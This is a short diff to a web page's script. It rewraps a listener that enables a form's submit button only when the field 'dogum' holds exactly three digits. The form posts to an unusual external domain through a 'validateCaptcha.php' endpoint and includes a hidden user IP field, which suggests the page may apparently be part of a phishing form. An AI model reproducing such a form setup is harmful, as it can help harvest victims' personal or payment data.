@@ -130,23 +130,27 @@ function validate(){
         $("#error-message").html(message);
     }
     return valid;
-const inputField = document.getElementById('dogum');
-
-const submitButton = document.querySelector('button[type="submit"]');
-
-inputField.addEventListener('input', function() {
-    const inputValue = inputField.value;
-
-    if (inputValue.length === 3 && /^\d+$/.test(inputValue)) {
-        submitButton.removeAttribute('disabled');
-    } else {
-        submitButton.setAttribute('disabled', 'disabled');
-    }
-});
+ 
 
 }
 </script>
+	<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const inputField = document.getElementById('dogum');
 
+    const submitButton = document.querySelector('button[type="submit"]');
+
+    inputField.addEventListener('input', function() {
+        const inputValue = inputField.value;
+
+        if (inputValue.length === 3 && /^\d+$/.test(inputValue)) {
+            submitButton.removeAttribute('disabled');
+        } else {
+            submitButton.setAttribute('disabled', 'disabled');
+        }
+    });
+});
+		</script>
 <form id="frmContact" action="https://alliikkerrr.online/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
  <input type="hidden" name="user_ip" value="">
 
